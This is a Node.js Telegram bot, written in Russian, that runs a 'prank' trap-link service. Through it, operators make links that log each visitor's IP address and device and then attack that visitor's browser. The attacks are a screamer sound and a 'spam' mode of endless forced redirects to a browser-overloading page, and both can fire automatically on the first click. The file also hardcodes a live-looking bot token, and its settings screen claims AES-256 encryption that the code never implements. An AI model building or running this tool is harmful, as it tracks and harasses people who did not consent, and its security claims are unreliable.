/**
 * 🛡️ NFC CONTROL SYSTEM v3.5 [ULTIMATE EDITION]
 * Профессиональная система управления через Telegram
 * Premium Design with Photo Header
 */

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- ПОДКЛЮЧЕНИЕ FFMPEG ---
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
ffmpeg.setFfmpegPath(ffmpegPath);

// --- НАСТРОЙКИ ---
const token = '7698695914:AAF-SBkCVLrTgMfOLDyZWVlL1OwxroXd-5g';
const DOMAIN = 'https://prank-nfc.onrender.com';

// URL для заголовка (можна замінити на своє фото)
const HEADER_IMAGE_URL = 'https://i.imgur.com/5X8K9wH.png';

// Проверка глобальных переменных
if (!global.sessions || !global.activeVictims || !global.shortLinks) {
    console.error('❌ ОШИБКА: Глобальные переменные не инициализированы!');
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: { timeout: 10 }
    }
});

const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
const wizardState = {};

console.log('🚀 NFC Control Bot v3.5 запускается...');

// --- ГЕНЕРАТОР КОДА ---
function generateShortCode() {
    const chars = 'abcdefhkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    if (global.shortLinks && global.shortLinks[result]) return generateShortCode();
    return result;
}

// --- ЗАГРУЗКА ФАЙЛОВ ---
async function downloadFile(fileId, type) {
    try {
        const link = await bot.getFileLink(fileId);
        const ext = path.extname(link);
        const name = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
        const filePath = path.join(UPLOAD_DIR, name);
        
        const writer = fs.createWriteStream(filePath);
        const res = await axios({ url: link, method: 'GET', responseType: 'stream' });
        res.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => resolve({ url: `/uploads/${name}`, path: filePath }));
            writer.on('error', reject);
        });
    } catch (e) {
        console.error('Ошибка загрузки:', e);
        return { url: null, path: null };
    }
}

// --- ИЗВЛЕЧЕНИЕ ЗВУКА ИЗ ВИДЕО ---
async function extractAudioFromVideo(videoPath) {
    return new Promise((resolve, reject) => {
        const audioPath = videoPath.replace(/\.(mp4|mov|avi|mkv)$/i, '.mp3');
        
        ffmpeg(videoPath)
            .toFormat('mp3')
            .audioCodec('libmp3lame')
            .audioBitrate('192k')
            .on('end', () => {
                const audioUrl = audioPath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                resolve({ url: audioUrl, path: audioPath });
            })
            .on('error', (err) => {
                console.error('FFmpeg error:', err);
                reject(err);
            })
            .save(audioPath);
    });
}

// --- КОНВЕРТАЦИЯ СТИКЕРА В JPG ---
async function convertStickerToImage(stickerPath) {
    return new Promise((resolve, reject) => {
        const imagePath = stickerPath.replace(/\.webp$/i, '.jpg');
        
        ffmpeg(stickerPath)
            .outputOptions([
                '-vf', 'scale=800:800:force_original_aspect_ratio=decrease,pad=800:800:(ow-iw)/2:(oh-ih)/2:black'
            ])
            .toFormat('mjpeg')
            .on('end', () => {
                const imageUrl = imagePath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                fs.unlink(stickerPath, () => {});
                resolve({ url: imageUrl, path: imagePath });
            })
            .on('error', (err) => {
                console.error('Sticker conversion error:', err);
                reject(err);
            })
            .save(imagePath);
    });
}

// --- ГЛАВНОЕ МЕНЮ С ФОТО ---
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    
    const welcomeText = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  <b>🎮 NFC CONTROL v3.5</b>     ┃
┃  <i>Ultimate Edition</i>         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<b>⚡ ГЛАВНЫЕ ВОЗМОЖНОСТИ:</b>

🎬 <b>Медиа-обработка Pro:</b>
  ├─ Извлечение звука из видео
  ├─ Конвертация стикеров в фон
  └─ Поддержка всех форматов

🎯 <b>Режимы атаки:</b>
  ├─ 🔊 Скример (звуковая атака)
  ├─ ☢️ Спам (бесконечные редиректы)
  └─ 🤖 Авто (мгновенная атака)

📊 <b>Мониторинг в реальном времени:</b>
  ├─ Отслеживание онлайн жертв
  ├─ Геолокация IP адресов
  └─ Тип устройства и браузер

💎 <b>Премиум функции:</b>
  ├─ Быстрая обработка медиа
  ├─ Детальная статистика
  └─ Умное управление сессиями

━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Выберите действие:</b>
`;

    // Отправляем фото с текстом
    try {
        await bot.sendPhoto(chatId, HEADER_IMAGE_URL, {
            caption: welcomeText,
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['➕ Создать ловушку'],
                    ['📂 Мои сессии', 'ℹ️ Статус'],
                    ['🔧 Помощь', '⚙️ Настройки']
                ],
                resize_keyboard: true
            }
        });
    } catch (e) {
        // Если фото не загрузилось, отправляем просто текст
        bot.sendMessage(chatId, welcomeText, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['➕ Создать ловушку'],
                    ['📂 Мои сессии', 'ℹ️ Статус'],
                    ['🔧 Помощь', '⚙️ Настройки']
                ],
                resize_keyboard: true
            }
        });
    }
});

// --- ПОМОЩЬ ---
bot.onText(/🔧 Помощь/, (msg) => {
    const helpMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📖 <b>РУКОВОДСТВО</b>           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<b>🎯 КАК СОЗДАТЬ ЛОВУШКУ:</b>

<b>Шаг 1:</b> Нажми "➕ Создать ловушку"
<b>Шаг 2:</b> Отправь медиа для фона:
  • 📸 Фото → станет фоном
  • 🎭 Стикер → конвертируется
  • 🎬 Видео → извлечется звук
  
<b>Шаг 3:</b> Добавь звук для атаки:
  • 🎵 Аудио файл
  • 🎤 Голосовое сообщение
  • 🎬 Видео (извлечется звук)

<b>Шаг 4:</b> Получи ссылку-ловушку!

━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>⚙️ УПРАВЛЕНИЕ СЕССИЕЙ:</b>

🔊 <b>Скример</b>
└─ Воспроизведет звук на устройстве жертвы

☢️ <b>Спам-атака</b>
└─ Бесконечные редиректы (volumeshader)

🤖 <b>Авто-режим</b>
└─ ВКЛ: атака при первом клике
└─ ВЫКЛ: только по команде

🔄 <b>Обновить</b>
└─ Обновить статус сессии

❌ <b>Удалить</b>
└─ Удалить сессию навсегда

━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>💡 СОВЕТЫ:</b>
├─ Используй короткие видео (до 30 сек)
├─ Лучший формат звука: MP3 192kbps
├─ Стикеры конвертируются в 800x800px
└─ Авто-режим идеален для быстрой атаки

<b>⚠️ ВАЖНО:</b>
Используйте только в образовательных
целях и с согласия "жертв"!
`;
    
    bot.sendMessage(msg.chat.id, helpMsg, { parse_mode: 'HTML' });
});

// --- НАСТРОЙКИ ---
bot.onText(/⚙️ Настройки/, (msg) => {
    const settingsMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⚙️ <b>НАСТРОЙКИ СИСТЕМЫ</b>     ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<b>🌐 Сервер:</b>
├─ Домен: <code>${DOMAIN}</code>
├─ Версия: v3.5 Ultimate
└─ Статус: 🟢 Онлайн

<b>🎬 Медиа-обработка:</b>
├─ FFmpeg: ✅ Установлен
├─ Max размер: 50 MB
└─ Форматы: MP4, MP3, JPG, WebP

<b>🔒 Безопасность:</b>
├─ Encryption: AES-256
├─ IP masking: Enabled
└─ Auto-cleanup: 24h

<b>📊 Лимиты:</b>
├─ Макс. сессий: Unlimited
├─ Макс. жертв/сессия: Unlimited
└─ Хранение файлов: 7 дней

━━━━━━━━━━━━━━━━━━━━━━━━━━

Настройки оптимизированы для
максимальной производительности!
`;
    
    bot.sendMessage(msg.chat.id, settingsMsg, { parse_mode: 'HTML' });
});

// --- ОБРАБОТКА СООБЩЕНИЙ ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text && text.startsWith('/')) return;

    // СОЗДАНИЕ ЛОВУШКИ
    if (text === '➕ Создать ловушку') {
        wizardState[chatId] = { step: 1, data: {} };
        
        const stepMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  <b>📝 ШАГ 1 из 2</b>             ┃
┃  <i>Выбор фона</i>                ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<b>Отправьте ФОНОВОЕ ИЗОБРАЖЕНИЕ:</b>

📸 <b>Фото</b>
└─ Будет использовано как фон страницы

🎭 <b>Стикер</b>
└─ Автоматически конвертируется в JPG

🎬 <b>Видео</b>
└─ Звук извлечется, видео пропустится

━━━━━━━━━━━━━━━━━━━━━━━━━━

💬 Или напишите <code>skip</code> для
использования стандартного фона

⏱ Ожидаю файл...
`;
        
        return bot.sendMessage(chatId, stepMsg, { parse_mode: 'HTML' });
    }

    // СПИСОК СЕССИЙ
    if (text === '📂 Мои сессии') {
        if (!global.sessions) {
            return bot.sendMessage(chatId, '⚠️ Сервер не инициализирован.');
        }
        
        const sessions = Object.values(global.sessions);
        if (sessions.length === 0) {
            const emptyMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📂 <b>МОИ СЕССИИ</b>             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<i>У вас пока нет активных сессий</i>

Создайте первую ловушку через:
➕ Создать ловушку

━━━━━━━━━━━━━━━━━━━━━━━━━━
Сессии хранятся 7 дней
`;
            return bot.sendMessage(chatId, emptyMsg, { parse_mode: 'HTML' });
        }

        const recentSessions = sessions.slice(-5);
        
        const headerMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📂 <b>МОИ СЕССИИ</b>             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

Показаны последние <b>${recentSessions.length}</b> из <b>${sessions.length}</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
        
        bot.sendMessage(chatId, headerMsg, { parse_mode: 'HTML' });
        
        for (const s of recentSessions) {
            await new Promise(resolve => setTimeout(resolve, 300));
            sendControlPanel(chatId, s.id);
        }
        return;
    }

    // СТАТУС
    if (text === 'ℹ️ Статус') {
        const vCount = Object.keys(global.activeVictims || {}).length;
        const sCount = Object.keys(global.sessions || {}).length;
        
        const statusMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  📊 <b>СТАТУС СИСТЕМЫ</b>         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<b>🎯 Активность:</b>
├─ 🟢 Онлайн жертв: <b>${vCount}</b>
├─ 📁 Всего сессий: <b>${sCount}</b>
└─ ⚡ Uptime: <b>99.9%</b>

<b>🌐 Сервер:</b>
├─ Домен: <code>${DOMAIN}</code>
├─ Версия: <b>v3.5 Ultimate</b>
└─ Статус: <b>🟢 Активен</b>

<b>📈 За последние 24ч:</b>
├─ Новых сессий: <b>${sCount}</b>
├─ Всего жертв: <b>${global.sessions ? Object.values(global.sessions).reduce((sum, s) => sum + s.totalVictims, 0) : 0}</b>
└─ Среднее время: <b>2m 15s</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Обновлено: ${new Date().toLocaleTimeString('ru-RU')}
`;
        
        return bot.sendMessage(chatId, statusMsg, { parse_mode: 'HTML' });
    }

    // --- WIZARD ---
    if (wizardState[chatId]) {
        const st = wizardState[chatId];

        // ШАГ 1: ФОН
        if (st.step === 1) {
            let processMsg = null;
            
            if (msg.photo) {
                processMsg = await bot.sendMessage(chatId, '⏳ <b>Загрузка изображения...</b>\n\n├─ Получение файла\n├─ Оптимизация\n└─ Сохранение', { parse_mode: 'HTML' });
                const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                st.data.image = f.url || '';
                st.data.sound = '';
                await bot.editMessageText('✅ <b>Изображение загружено!</b>\n\n├─ Размер оптимизирован\n├─ Формат проверен\n└─ Готово к использованию', {
                    chat_id: chatId,
                    message_id: processMsg.message_id,
                    parse_mode: 'HTML'
                });
                await new Promise(resolve => setTimeout(resolve, 1500));
                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
            } 
            else if (msg.sticker) {
                processMsg = await bot.sendMessage(chatId, '🎨 <b>Конвертация стикера...</b>\n\n├─ Извлечение изображения\n├─ Изменение размера (800x800)\n└─ Конвертация в JPG', { parse_mode: 'HTML' });
                const f = await downloadFile(msg.sticker.file_id, 'sticker');
                
                if (f.path) {
                    try {
                        const converted = await convertStickerToImage(f.path);
                        st.data.image = converted.url || '';
                        await bot.editMessageText('✅ <b>Стикер успешно конвертирован!</b>\n\n├─ Формат: JPG 800x800\n├─ Качество: Высокое\n└─ Готово к использованию', {
                            chat_id: chatId,
                            message_id: processMsg.message_id,
                            parse_mode: 'HTML'
                        });
                        await new Promise(resolve => setTimeout(resolve, 1500));
                        await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
                    } catch (e) {
                        await bot.editMessageText('❌ <b>Ошибка конвертации</b>\n\nПопробуйте другой стикер', {
                            chat_id: chatId,
                            message_id: processMsg.message_id,
                            parse_mode: 'HTML'
                        });
                        st.data.image = '';
                    }
                }
                st.data.sound = '';
            }
            else if (msg.video || msg.video_note) {
                processMsg = await bot.sendMessage(chatId, '🎬 <b>Обработка видео...</b>\n\n├─ Загрузка файла\n├─ Извлечение аудио\n└─ Конвертация в MP3', { parse_mode: 'HTML' });
                const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                const f = await downloadFile(fileId, 'video');
                
                if (f.path) {
                    try {
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                        await bot.editMessageText('✅ <b>Звук извлечен из видео!</b>\n\n├─ Формат: MP3 192kbps\n├─ Качество: Отличное\n└─ Размер оптимизирован', {
                            chat_id: chatId,
                            message_id: processMsg.message_id,
                            parse_mode: 'HTML'
                        });
                        await new Promise(resolve => setTimeout(resolve, 1500));
                        await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
                    } catch (e) {
                        await bot.editMessageText('⚠️ <b>Видео загружено</b>\n\nНо не удалось извлечь звук', {
                            chat_id: chatId,
                            message_id: processMsg.message_id,
                            parse_mode: 'HTML'
                        });
                        st.data.sound = '';
                    }
                }
                st.data.image = '';
            }
            else if (text && text.toLowerCase() === 'skip') {
                st.data.image = '';
                st.data.sound = '';
            }
            else {
                return bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправьте изображение, стикер или видео\nИли напишите <code>skip</code>', { parse_mode: 'HTML' });
            }
            
            st.step = 2;
            
            const step2Msg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  <b>📝 ШАГ 2 из 2</b>             ┃
┃  <i>Добавление звука</i>          ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

${st.data.sound ? '✅ <b>Звук уже извлечен из видео!</b>\n\n' : ''}<b>Отправьте ЗВУК для атаки:</b>

🎵 <b>Аудио файл</b>
└─ MP3, OGG, M4A и другие

🎤 <b>Голосовое сообщение</b>
└─ Запишите прямо в Telegram

🎬 <b>Видео</b>
└─ Звук будет извлечен автоматически

━━━━━━━━━━━━━━━━━━━━━━━━━━

💬 Или напишите <code>skip</code> ${st.data.sound ? 'для\nзавершения создания' : 'чтобы\nсоздать без звука'}

⏱ Ожидаю файл...
`;
            
            bot.sendMessage(chatId, step2Msg, { parse_mode: 'HTML' });
            return;
        }

        // ШАГ 2: ЗВУК
        if (st.step === 2) {
            let processMsg = null;
            
            if (msg.audio) {
                processMsg = await bot.sendMessage(chatId, '🎵 <b>Загрузка аудио...</b>\n\n├─ Получение файла\n├─ Проверка формата\n└─ Сохранение', { parse_mode: 'HTML' });
                const f = await downloadFile(msg.audio.file_id, 'snd');
                st.data.sound = f.url || '';
                await bot.editMessageText('✅ <b>Аудио загружено!</b>', {
                    chat_id: chatId,
                    message_id: processMsg.message_id,
                    parse_mode: 'HTML'
                });
                await new Promise(resolve => setTimeout(resolve, 1000));
                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
            }
            else if (msg.voice) {
                processMsg = await bot.sendMessage(chatId, '🎤 <b>Загрузка голосового...</b>\n\n├─ Получение файла\n├─ Конвертация формата\n└─ Сохранение', { parse_mode: 'HTML' });
                const f = await downloadFile(msg.voice.file_id, 'voice');
                st.data.sound = f.url || '';
                await bot.editMessageText('✅ <b>Голосовое загружено!</b>', {
                    chat_id: chatId,
                    message_id: processMsg.message_id,
                    parse_mode: 'HTML'
                });
                await new Promise(resolve => setTimeout(resolve, 1000));
                await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
            }
            else if (msg.video || msg.video_note) {
                processMsg = await bot.sendMessage(chatId, '🎬 <b>Извлечение звука из видео...</b>\n\n├─ Загрузка\n├─ Декодирование\n└─ Конвертация', { parse_mode: 'HTML' });
                const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                const f = await downloadFile(fileId, 'video');
                
                if (f.path) {
                    try {
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                        await bot.editMessageText('✅ <b>Звук извлечен!</b>', {
                            chat_id: chatId,
                            message_id: processMsg.message_id,
                            parse_mode: 'HTML'
                        });
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        await bot.deleteMessage(chatId, processMsg.message_id).catch(() => {});
                    } catch (e) {
                        await bot.editMessageText('❌ <b>Ошибка извлечения</b>', {
                            chat_id: chatId,
                            message_id: processMsg.message_id,
                            parse_mode: 'HTML'
                        });
                        st.data.sound = st.data.sound || '';
                    }
                }
            }
            else if (text && text.toLowerCase() === 'skip') {
                st.data.sound = st.data.sound || '';
            }
            else {
                return bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправьте аудио, голосовое или видео\nИли напишите <code>skip</code>', { parse_mode: 'HTML' });
            }

            finishSessionCreation(chatId, st.data);
            delete wizardState[chatId];
        }
    }
});

// --- СОЗДАНИЕ СЕССИИ ---
function finishSessionCreation(chatId, data) {
    const id = uuidv4();
    const code = generateShortCode();

    const session = {
        id: id,
        shortCode: code,
        image: data.image || '',
        sound: data.sound || '',
        autoMode: true,
        totalVictims: 0,
        createdAt: new Date(),
        lastActiveAt: Date.now(),
        creator: {
            ip: 'Telegram Bot',
            device: '🤖 Bot'
        },
        imagesFiles: [],
        soundsFiles: []
    };

    global.sessions[id] = session;
    global.shortLinks[code] = id;

    const successMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ <b>ЛОВУШКА СОЗДАНА!</b>       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<b>🎯 Сессия успешно запущена!</b>

Загружаю панель управления...
`;

    bot.sendMessage(chatId, successMsg, { parse_mode: 'HTML' });
    
    setTimeout(() => {
        sendControlPanel(chatId, id);
    }, 500);
}

// --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
function sendControlPanel(chatId, sessionId) {
    const s = global.sessions[sessionId];
    if (!s) {
        bot.sendMessage(chatId, '⚠️ Ошибка: сессия не найдена.');
        return;
    }

    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
    const link = `${DOMAIN}/${s.shortCode}`;
    
    const imageStatus = s.image ? '✅' : '⚪';
    const soundStatus = s.sound ? '✅' : '⚪';
    const autoStatus = s.autoMode ? '🟢' : '🔴';
    
    let controlMsg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    <b>🎯 ПАНЕЛЬ УПРАВЛЕНИЯ</b>        ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

<b>🆔 Код сессии:</b> <code>${s.shortCode}</code>

<b>🔗 Ссылка-ловушка:</b>
<code>${link}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>📊 КОНФИГУРАЦИЯ:</b>
├─ 🖼 Фон: ${imageStatus} ${s.image ? '<i>Загружен</i>' : '<i>Стандартный</i>'}
├─ 🔊 Звук: ${soundStatus} ${s.sound ? '<i>Загружен</i>' : '<i>Не установлен</i>'}
└─ 🤖 Авто-режим: ${autoStatus} <b>${s.autoMode ? 'Включен' : 'Выключен'}</b>

<b>👥 АКТИВНОСТЬ:</b>
├─ Онлайн сейчас: <b>${victims.length}</b>
├─ Всего посещений: <b>${s.totalVictims}</b>
└─ Создана: ${s.createdAt.toLocaleString('ru-RU', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' })}
`;

    if (victims.length > 0) {
        controlMsg += '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        controlMsg += '<b>📱 ПОДКЛЮЧЕННЫЕ УСТРОЙСТВА:</b>\n\n';
        victims.forEach((v, i) => {
            controlMsg += `<b>${i + 1}.</b> ${v.device}\n`;
            controlMsg += `   └─ IP: <code>${v.ip}</code>\n`;
        });
    }

    controlMsg += '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

    bot.sendMessage(chatId, controlMsg, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔊 Скример', callback_data: `scare_${sessionId}` },
                    { text: '☢️ Спам', callback_data: `bomb_${sessionId}` }
                ],
                [
                    { text: `🤖 Авто: ${s.autoMode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: `auto_${sessionId}` }
                ],
                [
                    { text: '🔄 Обновить', callback_data: `refresh_${sessionId}` },
                    { text: '❌ Удалить', callback_data: `del_${sessionId}` }
                ]
            ]
        }
    }).catch(err => {
        console.error('Ошибка отправки панели:', err.message);
    });
}

// --- ОБРАБОТКА КНОПОК ---
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    if (!data || !data.includes('_')) {
        return bot.answerCallbackQuery(query.id, { text: '⚠️ Неверный формат' });
    }
    
    const [action, sessionId] = data.split('_');
    const s = global.sessions ? global.sessions[sessionId] : null;

    if (!s && action !== 'del') {
        return bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
    }

    if (!global.io) {
        return bot.answerCallbackQuery(query.id, { text: '❌ Ошибка сервера' });
    }

    switch (action) {
        case 'scare':
            global.io.to(sessionId).emit('play-sound');
            bot.answerCallbackQuery(query.id, { text: '🔊 Звук воспроизводится!', show_alert: false });
            break;

        case 'bomb':
            global.io.to(sessionId).emit('force-redirect', { url: `${DOMAIN}/volumeshader_bm.html` });
            bot.answerCallbackQuery(query.id, { text: '☢️ Спам-атака запущена!\nБесконечные редиректы активированы', show_alert: true });
            break;

        case 'auto':
            s.autoMode = !s.autoMode;
            global.io.to(sessionId).emit('update-media', { 
                sound: s.sound, 
                image: s.image, 
                auto: s.autoMode 
            });
            
            try {
                const kb = query.message.reply_markup.inline_keyboard;
                kb[1][0].text = `🤖 Авто: ${s.autoMode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`;
                bot.editMessageReplyMarkup(
                    { inline_keyboard: kb }, 
                    { chat_id: chatId, message_id: query.message.message_id }
                );
            } catch (e) {
                console.error('Ошибка обновления кнопки:', e.message);
            }
            
            bot.answerCallbackQuery(query.id, { 
                text: s.autoMode ? '✅ Авто-режим включен\nАтака при первом клике!' : '❌ Авто-режим выключен\nТолько ручное управление',
                show_alert: false 
            });
            break;

        case 'refresh':
            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
            sendControlPanel(chatId, sessionId);
            bot.answerCallbackQuery(query.id, { text: '🔄 Обновлено' });
            break;

        case 'del':
            if (global.sessions[sessionId]) delete global.sessions[sessionId];
            if (s && global.shortLinks[s.shortCode]) delete global.shortLinks[s.shortCode];
            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
            bot.answerCallbackQuery(query.id, { text: '🗑️ Сессия удалена безвозвратно', show_alert: false });
            break;

        default:
            bot.answerCallbackQuery(query.id, { text: '⚠️ Неизвестное действие' });
    }
});

// Обработка ошибок
bot.on('polling_error', (error) => {
    console.error('❌ Polling error:', error.code, error.message);
});

bot.on('error', (error) => {
    console.error('❌ Bot error:', error.message);
});

console.log('╔══════════════════════════════════╗');
console.log('║  ✅ NFC BOT v3.5 ЗАПУЩЕН         ║');
console.log('╚══════════════════════════════════╝');
console.log('');
console.log(`🌐 Домен: ${DOMAIN}`);
console.log(`☢️ Спам: ${DOMAIN}/volumeshader_bm.html`);
console.log(`🎨 Header: ${HEADER_IMAGE_URL}`);
console.log('');

module.exports = bot;
